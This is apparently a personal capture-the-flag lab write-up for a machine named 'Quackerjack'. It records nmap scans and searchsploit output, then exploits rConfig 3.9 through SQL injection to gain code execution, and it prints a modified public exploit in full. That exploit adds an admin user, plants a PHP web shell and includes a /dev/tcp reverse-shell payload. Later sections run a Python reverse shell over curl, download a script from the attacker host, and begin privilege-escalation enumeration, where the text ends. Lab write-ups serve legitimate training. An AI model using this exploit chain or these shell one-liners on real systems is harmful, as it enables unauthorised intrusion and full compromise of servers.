# Quackerjack

# Enumeration

## nmap

```
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -p- 192.168.143.57 -T4 -v                                                                                                                           130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-02 11:40 EST
Initiating Ping Scan at 11:40
Scanning 192.168.143.57 [4 ports]
Completed Ping Scan at 11:40, 0.21s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:40
Completed Parallel DNS resolution of 1 host. at 11:40, 0.02s elapsed
Initiating SYN Stealth Scan at 11:40
Scanning 192.168.143.57 [65535 ports]
Discovered open port 80/tcp on 192.168.143.57
Discovered open port 21/tcp on 192.168.143.57
Discovered open port 445/tcp on 192.168.143.57
Discovered open port 22/tcp on 192.168.143.57
Discovered open port 139/tcp on 192.168.143.57
Discovered open port 3306/tcp on 192.168.143.57
Discovered open port 111/tcp on 192.168.143.57
SYN Stealth Scan Timing: About 10.81% done; ETC: 11:45 (0:04:16 remaining)
SYN Stealth Scan Timing: About 24.96% done; ETC: 11:44 (0:03:03 remaining)
SYN Stealth Scan Timing: About 35.40% done; ETC: 11:44 (0:02:46 remaining)
SYN Stealth Scan Timing: About 47.76% done; ETC: 11:44 (0:02:12 remaining)
SYN Stealth Scan Timing: About 59.82% done; ETC: 11:44 (0:01:51 remaining)
SYN Stealth Scan Timing: About 74.51% done; ETC: 11:44 (0:01:07 remaining)
Discovered open port 8081/tcp on 192.168.143.57
SYN Stealth Scan Timing: About 85.65% done; ETC: 11:44 (0:00:38 remaining)
Completed SYN Stealth Scan at 11:44, 262.49s elapsed (65535 total ports)
Nmap scan report for 192.168.143.57
Host is up (0.19s latency).
Not shown: 65527 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8081/tcp open  blackice-icecap

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 262.86 seconds
           Raw packets sent: 131238 (5.774MB) | Rcvd: 1185 (122.395KB)
                                                                                                    
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -sV -sC -A 192.168.143.57 -p 21,22,80,111,139,445,3306  -T4                                                                                     130 ⨯ 1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-02 11:41 EST
Nmap scan report for 192.168.143.57
Host is up (0.18s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.49.143
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 a2:ec:75:8d:86:9b:a3:0b:d3:b6:2f:64:04:f9:fd:25 (RSA)
|   256 b6:d2:fd:bb:08:9a:35:02:7b:33:e3:72:5d:dc:64:82 (ECDSA)
|_  256 08:95:d6:60:52:17:3d:03:e4:7d:90:fd:b2:ed:44:86 (ED25519)
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Apache HTTP Server Test Page powered by CentOS
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       MariaDB (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|3.X|5.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.1
Aggressive OS guesses: Linux 4.4 (91%), Linux 4.9 (91%), Linux 3.10 - 3.12 (89%), Linux 3.10 (86%), Linux 3.10 - 3.16 (86%), Linux 4.0 (86%), Linux 3.10 - 4.11 (85%), Linux 3.11 - 4.1 (85%), Linux 3.18 (85%), Linux 3.2 - 4.9 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 11 hops
Service Info: Host: QUACKERJACK; OS: Unix

Host script results:
|_clock-skew: mean: 1h40m03s, deviation: 2h53m13s, median: 2s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.10.4)
|   Computer name: quackerjack
|   NetBIOS computer name: QUACKERJACK\x00
|   Domain name: \x00
|   FQDN: quackerjack
|_  System time: 2022-02-02T11:41:41-05:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-02T16:41:43
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   ... 10
11  179.73 ms 192.168.143.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.10 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -sV -sC -A 192.168.143.57 -p 8081  -T4                                                                                                                1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-02 11:44 EST
Nmap scan report for 192.168.143.57
Host is up (0.17s latency).

PORT     STATE SERVICE  VERSION
8081/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=quackerjack/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2020-06-22T19:28:25
|_Not valid after:  2021-06-22T19:28:25
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|3.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:3
Aggressive OS guesses: Linux 4.4 (90%), Linux 4.9 (90%), Linux 3.10 - 3.12 (89%), Linux 3.10 (86%), Linux 3.10 - 3.16 (86%), Linux 4.0 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8081/tcp)
HOP RTT       ADDRESS
1   171.15 ms 192.168.49.1
2   171.18 ms 192.168.143.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.21 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$             
```


## 80 - Web

## 8081 - Web
![](Pasted%20image%2020220203004658.png)

`admin`:`admin` doesn't work

### Exploits
```
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit rconfig                                                                                                                                            1 ⚙
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Campsite 2.6.1 - 'LocalizerConfig.php?g_documentRoot' Remote File Inclusion                                                           | php/webapps/30005.txt
HMS HICP Protocol + Intellicom - 'NetBiterConfig.exe' Remote Buffer Overflow                                                          | hardware/remote/10451.txt
Intellicom 1.3 - 'NetBiterConfig.exe Hostname' Data Remote Stack Buffer Overflow (PoC)                                                | windows/dos/33403.py
rConfig - install Command Execution (Metasploit)                                                                                      | linux/remote/47602.rb
rConfig 3.1.1 - Local File Inclusion                                                                                                  | php/webapps/39898.txt
rConfig 3.9 - 'searchColumn' SQL Injection                                                                                            | php/webapps/48208.py
rConfig 3.9.2 - Remote Code Execution                                                                                                 | php/webapps/47555.py
rConfig 3.9.3 - Authenticated Remote Code Execution                                                                                   | php/webapps/47982.py
rConfig 3.9.4 - 'search.crud.php' Remote Command Injection                                                                            | php/webapps/48241.py
rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution                                                              | php/webapps/48261.py
rConfig 3.9.5 - Remote Code Execution (Unauthenticated)                                                                               | php/webapps/48878.py
rConfig 3.9.6 - 'path' Local File Inclusion (Authenticated)                                                                           | php/webapps/49644.txt
rconfig 3.9.6 - Arbitrary File Upload                                                                                                 | php/webapps/49783.py
rConfig 3.9.6 - Arbitrary File Upload to Remote Code Execution (Authenticated) (1)                                                   | php/webapps/49665.txt
rConfig 3.93 - 'ajaxAddTemplate.php' Authenticated Remote Code Execution                                                              | php/webapps/48207.py
Rconfig 3.x - Chained Remote Code Execution (Metasploit)                                                                              | linux/remote/48223.rb
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ searchsploit -m 48261                                                                                                                                           1 ⚙
  Exploit: rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48261
     Path: /usr/share/exploitdb/exploits/php/webapps/48261.py
File Type: Python script, ASCII text executable

Copied to: /tmp/48261.py


                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 48261.py                                                                                                                                                1 ⚙
rConfig - 3.9 - Unauthenticated root RCE
[+] Usage : ./rconfig_exploit.py https://target yourIP yourPort
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 48261.py https://192.168.143.57:8081 192.168.49.143 8081                                                                                                1 ⚙
rConfig - 3.9 - Unauthenticated root RCE
[+] Adding a temporary admin user...
[+] Authenticating as goqsthyipw...
[+] Logged in successfully, triggering the payload...
[+] Check your listener !
[-] The command was not executed by the target or you forgot to open a listener...
[+] Removing the temporary admin user...
[+] Done.
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```


### SQL Extraction Test?

https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_CVE-2020-10220.py

```
┌──(kali㉿kali)-[/tmp]
└─$ wget https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/master/rconfig_CVE-2020-10220.py
--2022-02-02 11:57:21--  https://raw.githubusercontent.com/v1k1ngfr/exploits-rconfig/master/rconfig_CVE-2020-10220.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3958 (3.9K) [text/plain]
Saving to: ‘rconfig_CVE-2020-10220.py’

rconfig_CVE-2020-10220.py                 100%[=====================================================================================>]   3.87K  --.-KB/s    in 0s      

2022-02-02 11:57:21 (20.9 MB/s) - ‘rconfig_CVE-2020-10220.py’ saved [3958/3958]

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 rconfig_CVE-2020-10220.py 
rconfig 3.9 - SQL Injection PoC
[+] Usage : ./rconfig_exploit.py https://target
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 rconfig_CVE-2020-10220.py https://192.168.143.57:8081
rconfig 3.9 - SQL Injection PoC
[+] Triggering the payloads on https://192.168.143.57:8081/commands.inc.php
[+] Extracting the current DB name :
rconfig
[+] Extracting 10 first users :
admin:1:dc40b85276a1f4d7cb35f154236aa1b2
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
[+] Extracting 10 first devices :
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Maybe no more information ?
Done
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 

```

## SQL Injection

Based off 48261

```
#!/usr/bin/python3
import requests
import sys
import urllib.parse
import string
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from requests.exceptions import Timeout

print ("rConfig - 3.9 - SQL Injection")

if len(sys.argv) != 2:
    print ("[+] Usage : ./exploit.py https://target")
    exit()

target = sys.argv[1]

vuln_page="/commands.inc.php"
vuln_parameters="?searchOption=contains&searchField=vuln&search=search&searchColumn=command"

print ("[+] Running SQL Statement...")
addUserPayload=" ;SELECT SLEEP(10);--"
encoded_request = target+vuln_page+vuln_parameters+addUserPayload
firstrequest = requests.session()
exploit_req = firstrequest.get(encoded_request,verify=False)

```

```
┌──(kali㉿kali)-[/tmp]
└─$ time python3 exploit.py https://192.168.143.57:8081                                                                                                             1 ⚙
rConfig - 3.9 - SQL Injection
[+] Running SQL Statement...
python3 exploit.py https://192.168.143.57:8081  0.21s user 0.06s system 2% cpu 10.985 total
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$   
```


# Exploitation

## Webshell

Modified the exploit code
```
# Exploit Title: rConfig 3.9.4 - 'searchField' Unauthenticated Root Remote Code Execution
# Exploit Author: vikingfr
# Greetz : Orange Cyberdefense - team CSR-SO (https://cyberdefense.orange.com)
# Date: 2020-03-12
# CVE-2019-19509 + CVE-2019-19585 + CVE-2020-10220
# Exploit link : https://github.com/v1k1ngfr/exploits-rconfig/blob/master/rconfig_root_RCE_unauth.py
# Vendor Homepage: https://rconfig.com/ (see also : https://github.com/rconfig/rconfig)
# Software Link : https://www.rconfig.com/downloads/rconfig-3.9.4.zip
# Install scripts  :
# https://www.rconfig.com/downloads/scripts/install_rConfig.sh
# https://www.rconfig.com/downloads/scripts/centos7_install.sh
# https://www.rconfig.com/downloads/scripts/centos6_install.sh
# Version: tested v3.9.4
# Tested on: Apache/2.4.6 (CentOS 7.7) OpenSSL/1.0.2k-fips PHP/7.2.24
#
# Notes : If you want to reproduce in your lab environment follow those links :
# http://help.rconfig.com/gettingstarted/installation
# then
# http://help.rconfig.com/gettingstarted/postinstall
#
# Example :
# $ python3  rconfig_root_RCE_unauth_final.py http://1.1.1.1 1.1.1.2 3334
# rConfig - 3.9 - Unauthenticated root RCE
# [+] Adding a temporary admin user...
# [+] Authenticating as dywzxuvbah...
# [+] Logged in successfully, triggering the payload...
# [+] Check your listener !
# [+] The reverse shell seems to be opened :-)
# [+] Removing the temporary admin user...
# [+] Done.
#
# $ nc -nvlp 3334
# listening on [any] 3334 ...
# connect to [1.1.1.2] from (UNKNOWN) [1.1.1.1] 46186
# sh: no job control in this shell
# sh-4.2# id
# id
# uid=0(root) gid=0(root) groups=0(root)
# sh-4.2#

#!/usr/bin/python3
import requests
import sys
import urllib.parse
import string
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
from requests.exceptions import Timeout

print ("rConfig - 3.9 - Unauthenticated root RCE")

if len(sys.argv) != 4:
    print ("[+] Usage : ./rconfig_exploit.py https://target yourIP yourPort")
    exit()

target = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]

vuln_page="/commands.inc.php"
vuln_parameters="?searchOption=contains&searchField=vuln&search=search&searchColumn=command"
def generateUsername(stringLength=8):
    u= string.ascii_lowercase
    return ''.join(random.sample(u,stringLength))

print ("[+] Adding a temporary admin user...")
fake_id = str(random.randint(200,900))
fake_user = generateUsername(10)
fake_pass_md5 = "21232f297a57a5a743894a0e4a801fc3" # hash of 'admin'
fake_userid_md5 = "6c97424dc92f14ae78f8cc13cd08308d"
userleveladmin = 9 # Administrator
addUserPayload="%20;INSERT%20INTO%20`users`%20(`id`,%20`username`,%20`password`,%20`userid`,%20`userlevel`,%20`email`,%20`timestamp`,%20`status`)%20VALUES%20("+fake_id+",%20'"+fake_user+"',%20'"+fake_pass_md5+"',%20'"+fake_userid_md5+"',%209,%20'"+fake_user+"@domain.com',%201346920339,%201);--"
encoded_request = target+vuln_page+vuln_parameters+addUserPayload
firstrequest = requests.session()
exploit_req = firstrequest.get(encoded_request,verify=False)

request = requests.session()
login_info = {
    "user": fake_user,
    "pass": "admin",
    "sublogin": 1
}
print ("[+] Authenticating as "+fake_user+"...")
login_request = request.post(
    target+"/lib/crud/userprocess.php",
     login_info,
     verify=False,
     allow_redirects=True
 )

dashboard_request = request.get(target+"/dashboard.php", allow_redirects=False)

payload = ''' `touch /tmp/.'''+fake_user+'''.txt;sudo zip -q /tmp/.'''+fake_user+'''.zip /tmp/.'''+fake_user+'''.txt -T -TT '/bin/sh -i>& /dev/tcp/{0}/{1} 0>&1 #'` '''.format(ip, port)

payload = ''' `echo '<?php system($_GET['cmd']); ?>' >  cmd.php` '''

if dashboard_request.status_code == 200:
    print ("[+] Logged in successfully, triggering the payload...")
    encoded_request = target+"/lib/ajaxHandlers/ajaxArchiveFiles.php?path={0}&ext=random".format(urllib.parse.quote(payload))
    print ("[+] Check your listener !")
    try:
        exploit_req = request.get(encoded_request,timeout=10)
    except Timeout:
        print('[+] The reverse shell seems to be opened :-)')
    else:
        print('[-] The command was not executed by the target or you forgot to open a listener...')

elif dashboard_request.status_code == 302:
    print ("[-] Wrong credentials !? Maybe admin were not added...")
    exit()

'''
print("[+] Removing the temporary admin user...")
delUserPayload="%20;DELETE%20FROM%20`users`%20WHERE%20`username`='"+fake_user+"';--"
encoded_request = target+vuln_page+vuln_parameters+delUserPayload
lastrequest = requests.session()
exploit_req = lastrequest.get(encoded_request,verify=False)
print ("[+] Done.")
'''
```

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php                                                                                                   1 ⚙
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /lib/ajaxHandlers/cmd.php was not found on this server.</p>
</body></html>
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ python3 48261.py https://192.168.143.57:8081 192.168.49.143 443                                                                                                 1 ⚙
rConfig - 3.9 - Unauthenticated root RCE
[+] Adding a temporary admin user...
[+] Authenticating as cqlofvrbih...
[+] Logged in successfully, triggering the payload...
[+] Check your listener !
[-] The command was not executed by the target or you forgot to open a listener...
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php                                                                                                   1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php?cmd=whoami                                                                                        1 ⚙
apache
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$    
```

## Testing Ports
```
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 80                                                                                                                                  1 ⨯
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.143.57 - - [02/Feb/2022 12:30:27] "GET / HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ sudo python3 -m http.server 443 
Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
^C
Keyboard interrupt received, exiting.
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php?cmd=$(urlencode 'ls /usr/bin | grep python')                                                      1 ⚙
python
python2
python2.7
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php?cmd=$(urlencode 'ls /usr/bin | grep wget')                                                        1 ⚙
wget
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php?cmd=$(urlencode 'wget 192.168.49.143 -O /tmp/t')                                                  1 ⚙
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php?cmd=$(urlencode 'wget 192.168.49.143:4444 -O /tmp/t')                                             1 ⚙
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php?cmd=$(urlencode 'wget 192.168.49.143:443 -O /tmp/t')                                        130 ⨯ 1 ⚙
^C
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$       
```

## Reverse shell

```
┌──(kali㉿kali)-[/tmp]
└─$ curl -k  "https://192.168.143.57:8081/lib/ajaxHandlers/cmd.php?cmd=python%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.143%22,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/sh%22)'"
```

```
┌──(kali㉿kali)-[~]
└─$ sudo nc -nlvp 80               
listening on [any] 80 ...
connect to [192.168.49.143] from (UNKNOWN) [192.168.143.57] 52352
sh-4.2$ whoami
whoami
apache
sh-4.2$ pwd
pwd
/home/rconfig/www/lib/ajaxHandlers
sh-4.2$ cd /home/rconfig
cd /home/rconfig
sh-4.2$ ls
ls
LICENSE    classes        config    lib        reports    updates
README.md  composer.json  cronfeed  local.txt  templates  vendor
backups    composer.lock  data      logs       tmp        www
sh-4.2$ cat local.txt
cat local.txt
fc0753d5823f6f2c1c280a39a0362b9e
sh-4.2$ ifconfig
ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.143.57  netmask 255.255.255.0  broadcast 192.168.143.255
        ether 00:50:56:ba:f0:11  txqueuelen 1000  (Ethernet)
        RX packets 127918  bytes 7905490 (7.5 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2499  bytes 1784524 (1.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 170  bytes 13228 (12.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 170  bytes 13228 (12.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

sh-4.2$ 
```

![](Pasted%20image%2020220203013417.png)

# Privesc

```
sh-4.2$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/find
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount
/usr/sbin/unix_chkpwd
/usr/sbin/pam_timestamp_check
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
sh-4.2$ 
```

```
sh-4.2$ wget 192.168.49.143/lse.sh
wget 192.168.49.143/lse.sh
--2022-02-02 12:38:19--  http://192.168.49.143/lse.sh
Connecting to 192.168.49.143:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 43570 (43K) [text/x-sh]
Saving to: 'lse.sh'

100%[======================================>] 43,570       117KB/s   in 0.4s   

2022-02-02 12:38:20 (117 KB/s) - 'lse.sh' saved [43570/43570]

sh-4.2$ chmod +x lse.sh
chmod +x lse.sh
sh-4.2$ ./lse.sh
./lse.sh
---
If you know the current user password, write it here to check sudo privileges:                                                                                          

---
                                                                                                                                                                        
 LSE Version: 3.7                                                                                                                                                       

        User: apache
     User ID: 48
    Password: none
        Home: /usr/share/httpd
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin
       umask: 0022

    Hostname: quackerjack
       Linux: 3.10.0-1127.10.1.el7.x86_64
Distribution: CentOS Linux 7 (Core)
Architecture: x86_64

==================================================================( users )=====
[i] usr000 Current user groups............................................. yes!
[*] usr010 Is current user in an administrative group?..................... nope
[*] usr020 Are there other users in administrative groups?................. nope
[*] usr030 Other users with shell.......................................... yes!
[i] usr040 Environment information......................................... skip
[i] usr050 Groups for other users.......................................... skip                                                                                        
[i] usr060 Other users..................................................... skip                                                                                        
[*] usr070 PATH variables defined inside /etc.............................. yes!                                                                                        
[!] usr080 Is '.' in a PATH variable defined inside /etc?.................. nope
===================================================================( sudo )=====
[!] sud000 Can we sudo without a password?................................. nope
[!] sud010 Can we list sudo commands without a password?................... nope
[*] sud040 Can we read sudoers files?...................................... nope
[*] sud050 Do we know if any other users used sudo?........................ nope
============================================================( file system )=====
[*] fst000 Writable files outside user's home.............................. yes!
[*] fst010 Binaries with setuid bit........................................ yes!
[!] fst020 Uncommon setuid binaries........................................ yes!
---
/usr/bin/find
---
[!] fst030 Can we write to any setuid binary?.............................. nope
[*] fst040 Binaries with setgid bit........................................ skip
[!] fst050 Uncommon setgid binaries........................................ skip                                                                                        
[!] fst060 Can we write to any setgid binary?.............................. skip                                                                                        
[*] fst070 Can we read /root?.............................................. nope                                                                                        
[*] fst080 Can we read subdirectories under /home?......................... yes!
[*] fst090 SSH files in home directories................................... nope
[*] fst100 Useful binaries................................................. yes!
[*] fst110 Other interesting files in home directories..................... nope
[!] fst120 Are there any credentials in fstab/mtab?........................ nope
[*] fst130 Does 'apache' have mail?........................................ nope
[!] fst140 Can we access other users mail?................................. nope
[*] fst150 Looking for GIT/SVN repositories................................ nope
[!] fst160 Can we write to critical files?................................. nope
[!] fst170 Can we write to critical directories?........................... nope
[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
[!] fst190 Can we read any backup?......................................... nope
[!] fst200 Are there possible credentials in any shell history file?....... nope
[!] fst210 Are there NFS exports with 'no_root_squash' option?............. nope
[*] fst220 Are there NFS exports with 'no_all_squash' option?.............. nope
[i] fst500 Files owned by user 'apache'.................................... skip
[i] fst510 SSH files anywhere.............................................. skip                                                                                        
[i] fst520 Check hosts.equiv file and its contents......................... skip                                                                                        
[i] fst530 List NFS server shares.......................................... skip                                                                                        
[i] fst540 Dump fstab file................................................. skip                                                                                        
=================================================================( system )=====                                                                                        
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip                                                                                        
[!] sys020 Does the /etc/passwd have hashes?............................... nope                                                                                        
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... nope
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip                                                                                        
[i] sys080 System password policies in /etc/login.defs..................... skip                                                                                        
===============================================================( security )=====                                                                                        
[*] sec000 Is SELinux present?............................................. yes!
[*] sec010 List files with capabilities.................................... yes!
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
[!] sec060 Can we read the auditd log?..................................... nope                                                                                        
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... nope
[!] ret010 Cron tasks writable by user..................................... nope
[*] ret020 Cron jobs....................................................... yes!
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. nope
[!] ret060 Can we write to executable paths present in cron jobs........... skip
[i] ret400 Cron files...................................................... skip                                                                                        
[*] ret500 User systemd timers............................................. nope                                                                                        
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====                                                                                        
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip                                                                                        
[i] net520 ARP table....................................................... skip                                                                                        
[i] net530 Nameservers..................................................... skip                                                                                        
[i] net540 Systemd Nameservers............................................. skip                                                                                        
[i] net550 Listening TCP................................................... skip                                                                                        
[i] net560 Listening UDP................................................... skip                                                                                        
===============================================================( services )=====                                                                                        
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip                                                                                        
[i] srv420 List /etc/xinetd.d if used...................................... skip                                                                                        
[i] srv430 List /etc/init.d/ permissions................................... skip                                                                                        
